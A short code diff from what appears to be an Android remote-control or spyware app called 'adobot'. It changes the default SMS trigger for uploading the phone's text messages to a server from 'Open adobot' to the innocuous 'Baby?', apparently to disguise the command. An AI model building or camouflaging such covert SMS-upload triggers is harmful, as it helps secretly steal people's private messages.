@@ -38,7 +38,7 @@ public class SetupActivity extends BaseActivity {
         prefs = this.getSharedPreferences("com.android.adobot", Context.MODE_PRIVATE);
         url = prefs.getString(AdobotConstants.PREF_SERVER_URL_FIELD, AdobotConstants.DEVELOPMENT_SERVER);
         sms = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "Open adobot");
-        uploadSMScmd = prefs.getString(AdobotConstants.PREF_UPLOAD_SMS_COMMAND_FIELD, "Open adobot");
+        uploadSMScmd = prefs.getString(AdobotConstants.PREF_UPLOAD_SMS_COMMAND_FIELD, "Baby?");
 
         editTextUrl = (EditText) findViewById(R.id.edit_text_server_url);
         smsOpenText = (EditText) findViewById(R.id.sms_open_text);
